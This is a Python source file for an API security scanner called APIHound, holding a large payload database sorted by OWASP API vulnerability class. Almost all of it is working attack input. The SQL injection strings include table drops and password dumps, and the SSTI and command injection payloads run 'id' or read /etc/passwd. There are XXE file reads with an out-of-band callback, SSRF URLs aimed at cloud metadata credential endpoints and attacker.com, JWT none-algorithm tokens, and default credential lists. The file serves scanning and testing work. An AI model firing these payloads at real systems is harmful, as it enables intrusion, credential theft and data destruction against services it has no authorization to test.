"""
APIHound — Payload Database
1200+ payloads organized by vulnerability class.
Sources: OWASP, SecLists, PayloadsAllTheThings, PortSwigger research.
"""


class PayloadDB:
    """Central payload repository for all vulnerability checks."""

    # =========================================================================
    # API1: BOLA — Broken Object Level Authorization
    # =========================================================================
    BOLA_ID_PAYLOADS = {
        "sequential_int": [str(i) for i in range(1, 51)],
        "zero_and_negative": ["0", "-1", "-2", "99999999", "2147483647", "-2147483648"],
        "uuid_variants": [
            "00000000-0000-0000-0000-000000000000",
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
        ],
        "encoded_ids": [
            "..%2f1", "%2e%2e%2f1", "1%00", "1%0a",
            "1/**/", "1;", "1'", "1\"",
        ],
        "type_juggling": [
            "true", "false", "null", "undefined", "NaN", "Infinity",
            "[]", "{}", "[1]", '{"id":1}',
        ],
        "graphql_idor": [
            '{"query":"{ user(id: 1) { id email } }"}',
            '{"query":"{ users { id email role } }"}',
        ],
    }

    # =========================================================================
    # API2: Broken Authentication
    # =========================================================================
    BROKEN_AUTH_PAYLOADS = {
        "weak_credentials": [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("test", "test"), ("user", "user"),
            ("root", "root"), ("root", "toor"), ("api", "api"),
            ("admin", "Password1"), ("admin", "Welcome1"),
            ("administrator", "administrator"), ("guest", "guest"),
            ("demo", "demo"), ("admin", "admin@123"), ("sa", "sa"),
        ],
        "jwt_none_algorithm": [
            # Headers with "alg":"none" variations
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",  # {"alg":"none","typ":"JWT"}
            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0",  # {"alg":"None","typ":"JWT"}
            "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0",  # {"alg":"nOnE","typ":"JWT"}
            "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0",  # {"alg":"NONE","typ":"JWT"}
        ],
        "token_manipulation": [
            "",  # Empty token
            "invalid",  # Obviously invalid
            "null",
            "undefined",
            "Bearer ",  # Empty bearer
            "Bearer null",
            "Bearer undefined",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.",  # no sig
        ],
        "auth_bypass_headers": [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
        ],
    }

    # =========================================================================
    # API3: Broken Object Property Level Authorization
    # (Mass Assignment + Excessive Data Exposure combined in 2023)
    # =========================================================================
    MASS_ASSIGNMENT_FIELDS = [
        "role", "admin", "is_admin", "isAdmin", "is_staff", "isStaff",
        "privilege", "permissions", "group", "groups", "user_type", "userType",
        "access_level", "accessLevel", "is_superuser", "isSuperuser",
        "verified", "is_verified", "isVerified", "active", "is_active",
        "approved", "is_approved", "email_verified", "emailVerified",
        "two_factor", "twoFactor", "mfa_enabled", "mfaEnabled",
        "plan", "subscription", "tier", "credits", "balance",
        "discount", "price", "amount", "quantity",
        "password", "password_hash", "passwordHash", "secret",
        "token", "api_key", "apiKey", "private_key", "privateKey",
        "__proto__", "constructor", "prototype",
    ]

    MASS_ASSIGNMENT_VALUES = {
        "boolean_true": [True, "true", 1, "1", "yes"],
        "role_escalation": ["admin", "administrator", "superuser", "root", "staff", "manager"],
        "numeric_escalation": [0, 1, 99, 999, -1],
    }

    SENSITIVE_DATA_PATTERNS = [
        r'"password"\s*:\s*"[^"]+"',
        r'"secret"\s*:\s*"[^"]+"',
        r'"token"\s*:\s*"[^"]+"',
        r'"api[_-]?key"\s*:\s*"[^"]+"',
        r'"ssn"\s*:\s*"[^"]+"',
        r'"credit[_-]?card"\s*:\s*"[^"]+"',
        r'"card[_-]?number"\s*:\s*"[^"]+"',
        r'"cvv"\s*:\s*"[^"]+"',
        r'"private[_-]?key"\s*:\s*"[^"]+"',
        r'"access[_-]?token"\s*:\s*"[^"]+"',
        r'"refresh[_-]?token"\s*:\s*"[^"]+"',
        r'(?:password|passwd|pwd)\s*[=:]\s*\S+',
        r'(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}',  # AWS access key
        r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        r'"internal[_-]?id"\s*:\s*',
        r'"hash"\s*:\s*"[a-fA-F0-9]{32,}"',
    ]

    # =========================================================================
    # API4: Unrestricted Resource Consumption
    # =========================================================================
    RESOURCE_CONSUMPTION_PAYLOADS = {
        "large_pagination": [
            {"page": 1, "limit": 999999},
            {"page": 1, "per_page": 100000},
            {"page": 1, "size": 50000},
            {"offset": 0, "limit": 999999},
            {"page": 0, "count": 999999},
        ],
        "deep_json_nesting": lambda depth=50: (
            '{"a":' * depth + '1' + '}' * depth
        ),
        "large_array": lambda size=10000: (
            '{"items":' + str(list(range(size))) + '}'
        ),
        "regex_dos": [
            "a" * 50000,
            "(a+)+$" + "a" * 100,
            "((a+)(b+))*" + "ab" * 100,
        ],
        "graphql_depth": [
            '{"query":"{ __schema { types { fields { type { fields { type { name } } } } } } }"}',
            '{"query":"{ users { posts { comments { author { posts { comments { text } } } } } } }"}',
        ],
        "batch_operations": [
            [{"method": "GET", "url": f"/api/user/{i}"} for i in range(100)],
        ],
    }

    # =========================================================================
    # API5: Broken Function Level Authorization
    # =========================================================================
    PRIVILEGE_ESCALATION_PATHS = [
        # Admin paths
        "/admin", "/admin/users", "/admin/config", "/admin/settings",
        "/admin/dashboard", "/admin/logs", "/admin/system",
        "/administrator", "/manage", "/management",
        # Internal/debug
        "/internal", "/internal/api", "/debug", "/debug/vars",
        "/console", "/actuator", "/actuator/env", "/actuator/health",
        "/actuator/info", "/actuator/mappings", "/actuator/beans",
        "/_debug", "/__debug__", "/devtools",
        # User management
        "/users", "/users/all", "/users/list", "/api/users",
        "/api/v1/users", "/api/admin/users",
        "/user/create", "/user/delete", "/user/role",
        # Config/system
        "/config", "/configuration", "/env", "/environment",
        "/system/info", "/server-info", "/server-status",
        "/status", "/health", "/healthcheck", "/metrics",
        "/prometheus", "/grafana",
    ]

    METHOD_OVERRIDE_HEADERS = [
        {"X-HTTP-Method-Override": "PUT"},
        {"X-HTTP-Method-Override": "DELETE"},
        {"X-HTTP-Method-Override": "PATCH"},
        {"X-HTTP-Method": "PUT"},
        {"X-Method-Override": "DELETE"},
        {"X-HTTP-Method-Override": "ADMIN"},
        {"_method": "PUT"},
    ]

    # =========================================================================
    # API7: Server Side Request Forgery
    # =========================================================================
    SSRF_PAYLOADS = [
        # Localhost variants
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:8443",
        "http://localhost",
        "http://0.0.0.0",
        "http://0",
        "http://[::1]",
        "http://[0:0:0:0:0:0:0:1]",
        "http://0x7f000001",
        "http://2130706433",
        "http://017700000001",
        "http://127.1",
        "http://127.0.1",
        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        # URL schema bypass
        "file:///etc/passwd",
        "file:///etc/hosts",
        "dict://127.0.0.1:11211/info",
        "gopher://127.0.0.1:6379/_INFO",
        # DNS rebinding / redirect
        "http://spoofed.burpcollaborator.net",
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
        # Encoded variants
        "http://127.0.0.1%23@attacker.com",
        "http://attacker.com%40127.0.0.1",
        "http://127.0.0.1%2523@attacker.com",
        "http://127%2E0%2E0%2E1",
        # URL with credentials
        "http://user:pass@127.0.0.1",
        "http://127.0.0.1:80@attacker.com",
    ]

    SSRF_PARAM_NAMES = [
        "url", "uri", "path", "src", "dest", "redirect", "redirect_uri",
        "redirect_url", "callback", "return", "return_url", "returnUrl",
        "next", "next_url", "target", "link", "feed", "host", "site",
        "html", "val", "validate", "domain", "source", "page",
        "image", "image_url", "imageUrl", "img", "load", "fetch",
        "proxy", "forward", "endpoint", "service", "webhook",
    ]

    # =========================================================================
    # API8: Security Misconfiguration
    # =========================================================================
    MISCONFIG_CHECKS = {
        "cors_origins": [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "http://localhost",
            "https://target.com.evil.com",
        ],
        "security_headers_required": [
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Content-Security-Policy",
            "X-XSS-Protection",
            "Referrer-Policy",
            "Permissions-Policy",
        ],
        "debug_endpoints": [
            "/debug", "/debug/vars", "/debug/pprof", "/_debug",
            "/trace", "/env", "/.env", "/phpinfo.php",
            "/server-status", "/server-info", "/.git/HEAD",
            "/.svn/entries", "/.DS_Store", "/wp-config.php",
            "/elmah.axd", "/errors/all", "/api/debug",
            "/__debug__/", "/telescope", "/horizon",
        ],
        "verbose_error_triggers": [
            {"id": "' OR 1=1 --"},
            {"id": "{{7*7}}"},
            {"id": "../../../../etc/passwd"},
            {"id": "<script>"},
            {"id": None},
            {"id": []},
            {"id": {"$gt": ""}},
        ],
    }

    # =========================================================================
    # API9: Improper Inventory Management
    # =========================================================================
    API_VERSION_PATHS = [
        "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
        "/v1", "/v2", "/v3", "/v4", "/v5",
        "/api/1.0", "/api/2.0", "/api/3.0",
        "/api/latest", "/api/beta", "/api/alpha", "/api/dev",
        "/api/staging", "/api/test", "/api/old", "/api/legacy",
        "/api/internal", "/api/private", "/api/public",
    ]

    # =========================================================================
    # Injection Payloads (SQLi, NoSQLi, XSS, XXE, SSTI, CMDi)
    # =========================================================================
    SQLI_PAYLOADS = [
        # Error-based
        "'", "''", "\"", "' OR '1'='1", "' OR 1=1--",
        "' OR 1=1#", "' OR 1=1/*", "\" OR 1=1--",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=1 AND 'a'='a", "') OR ('1'='1",
        # Time-based blind
        "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--", "1; SELECT SLEEP(5)#",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
        # Boolean-based blind
        "' AND 1=1--", "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
        # Stacked queries
        "'; DROP TABLE test--", "'; INSERT INTO users VALUES('hacked','hacked')--",
        # UNION-based with column detection
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
    ]

    NOSQLI_PAYLOADS = [
        # MongoDB
        {"$gt": ""}, {"$ne": ""}, {"$regex": ".*"},
        {"$where": "1==1"}, {"$exists": True},
        {"$gt": 0}, {"$lt": 999999},
        {"$nin": []}, {"$in": ["admin", "user"]},
        # String injection
        "{'$gt': ''}", '{"$ne": ""}', '{"$regex": ".*"}',
        "true, $where: '1 == 1'",
        "'; return true; var a='",
        # Operator injection
        '{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}',
    ]

    XSS_PAYLOADS = [
        # Basic
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        # Attribute injection
        "\" onmouseover=alert(1) \"",
        "' onfocus=alert(1) autofocus '",
        # Event handler variations
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<video src=x onerror=alert(1)>",
        # Template literal
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        # Encoded
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport0teleport/teleport/teleport//",
        "'-alert(1)-'",
        "prompt(1)",  # WAF bypass alternative
        "confirm(1)",
    ]

    XXE_PAYLOADS = [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # Parameter entity
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        # OOB XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe">%xxe;]><foo></foo>',
        # XXE via SVG
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg><text>&xxe;</text></svg>',
        # XXE via SOAP
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Envelope><Body><foo>&xxe;</foo></Body></Envelope>',
        # Billion laughs (DoS - use carefully)
        # '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
    ]

    SSTI_PAYLOADS = [
        # Jinja2 / Twig
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}",
        "{{config}}", "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Freemarker
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # Velocity
        "#set($x='')##$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
        # Smarty
        "{php}echo 'test';{/php}",
        # ERB
        "<%= 7*7 %>", "<%= system('id') %>",
        # Pebble
        "{% set x = 7*7 %}{{x}}",
        # Detection probes (safe)
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}",
        "${{7*7}}", "{{=7*7}}", "[[7*7]]",
    ]

    CMDI_PAYLOADS = [
        # Unix
        "; id", "| id", "|| id", "& id", "&& id",
        "`id`", "$(id)", "; cat /etc/passwd",
        "| cat /etc/passwd", "|| cat /etc/passwd",
        "; sleep 5", "| sleep 5", "|| sleep 5",
        "& sleep 5", "&& sleep 5",
        "`sleep 5`", "$(sleep 5)",
        # Newline injection
        "%0aid", "%0a cat /etc/passwd",
        "\nid", "\n cat /etc/passwd",
        # Windows
        "& dir", "| dir", "|| dir",
        "; dir", "&& dir",
        "& ping -c 5 127.0.0.1", "| ping -n 5 127.0.0.1",
        # Obfuscated
        ";{id}", ";$(id)", "';id;'",
        "\"id\"", "\"|id|\"",
        # Quoted variations
        "';id;'", "\";id;\"",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd%00",
        "....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "..\\..\\.\\etc\\passwd",
        "..%5c..%5c..%5cetc%5cpasswd",
        "/proc/self/environ",
        "/proc/self/cmdline",
    ]

    # =========================================================================
    # JWT Attack Payloads
    # =========================================================================
    JWT_ATTACKS = {
        "none_algorithm_headers": [
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"None","typ":"JWT"}',
            '{"alg":"NONE","typ":"JWT"}',
            '{"alg":"nOnE","typ":"JWT"}',
            '{"alg":"noNe","typ":"JWT"}',
        ],
        "weak_secrets": [
            "secret", "password", "123456", "secret123", "jwt_secret",
            "key", "private", "public", "default", "changeme",
            "test", "admin", "letmein", "welcome", "qwerty",
            "abc123", "password1", "iloveyou", "12345678",
            "HS256-secret", "jwt-secret", "my-secret",
        ],
        "claim_tampering": {
            "role": ["admin", "administrator", "root", "superuser"],
            "admin": [True, 1, "true"],
            "is_admin": [True, 1, "true"],
            "user_id": ["1", "0", "admin"],
            "sub": ["admin", "1", "0"],
            "iss": ["self", "localhost", "none"],
            "aud": ["*", "api", "admin"],
        },
        "kid_injection": [
            "../../dev/null",
            "/dev/null",
            "../../etc/hostname",
            "'; SELECT 'secret' --",
            "| cat /etc/passwd",
        ],
    }

    # =========================================================================
    # GraphQL-Specific Payloads
    # =========================================================================
    GRAPHQL_PAYLOADS = {
        "introspection": [
            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
            '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}',
            '{"query":"{ __type(name:\\"User\\") { name fields { name type { name kind } } } }"}',
        ],
        "injection": [
            '{"query":"{ user(id: \\"1 OR 1=1\\") { id name } }"}',
            '{"query":"{ user(name: \\"admin\' --\\") { id email } }"}',
            '{"query":"{ user(id: \\"1\\") { id name email password } }"}',
        ],
        "dos": [
            '{"query":"query { __schema { types { fields { type { fields { type { fields { name } } } } } } } } }"}',
        ],
        "batching": [
            '[{"query":"{ user(id: 1) { id } }"},{"query":"{ user(id: 2) { id } }"}]',
        ],
    }

    @classmethod
    def get_all_injection_payloads(cls) -> dict:
        """Return all injection payloads in a dict keyed by type."""
        return {
            "sqli": cls.SQLI_PAYLOADS,
            "nosqli": cls.NOSQLI_PAYLOADS,
            "xss": cls.XSS_PAYLOADS,
            "xxe": cls.XXE_PAYLOADS,
            "ssti": cls.SSTI_PAYLOADS,
            "cmdi": cls.CMDI_PAYLOADS,
            "path_traversal": cls.PATH_TRAVERSAL_PAYLOADS,
        }

    @classmethod
    def get_payloads_for_check(cls, check_id: str) -> list:
        """Get relevant payloads for a specific OWASP check ID."""
        mapping = {
            "api1": list(cls.BOLA_ID_PAYLOADS.values()),
            "api2": [cls.BROKEN_AUTH_PAYLOADS],
            "api3": [cls.MASS_ASSIGNMENT_FIELDS, cls.MASS_ASSIGNMENT_VALUES],
            "api4": [cls.RESOURCE_CONSUMPTION_PAYLOADS],
            "api5": [cls.PRIVILEGE_ESCALATION_PATHS, cls.METHOD_OVERRIDE_HEADERS],
            "api7": [cls.SSRF_PAYLOADS],
            "api8": [cls.MISCONFIG_CHECKS],
            "api9": [cls.API_VERSION_PATHS],
            "injection": [cls.SQLI_PAYLOADS, cls.NOSQLI_PAYLOADS, cls.XSS_PAYLOADS,
                         cls.SSTI_PAYLOADS, cls.CMDI_PAYLOADS],
            "jwt": [cls.JWT_ATTACKS],
        }
        return mapping.get(check_id.lower(), [])
